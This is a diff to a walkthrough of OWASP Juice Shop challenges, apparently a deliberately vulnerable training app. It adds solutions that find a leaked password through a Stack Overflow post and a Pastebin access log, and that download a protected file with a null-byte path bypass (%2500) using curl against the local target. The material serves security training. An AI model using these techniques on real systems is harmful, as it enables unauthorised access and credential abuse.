@@ -113,7 +113,14 @@ curl -sS http://juiceshop:3000/api/Users/ -H 'Content-Type: application/json' --
 Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to
 
 ```bash
-TODO
+# "very popular help platform for developers" -> stackoverflow
+# "platform often used to share data quickly" -> pastebin
+https://stackoverflow.com/users/959592/bkimminich
+https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan
+https://pastebin.com/4U1V1UjU
+
+curl -sS https://pastebin.com/raw/4U1V1UjU | grep pass
+# 161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET /rest/user/change-password?current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB&new=sjss22%@%E2%82%AC55jaJasj!.k&repeat=sjss22%@%E2%82%AC55jaJasj!.k8 HTTP/1.1" 401 39 "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"
 ```
 
 ## Leaked Unsafe Product
@@ -171,9 +178,11 @@ curl -sS http://juiceshop:3000/rest/user/reset-password \
 
 ## Misplaced Signature File
 
+* [Sigma - Generic Signature Format for SIEM Systems](https://sigmahq.io)
+
 Access a misplaced SIEM signature file.
 ```bash
-TODO
+curl http://juiceshop:3000/ftp/suspicious_errors.yml%2500.md -o suspicious_errors.yml
 ```
 
 ## NFT Takeover
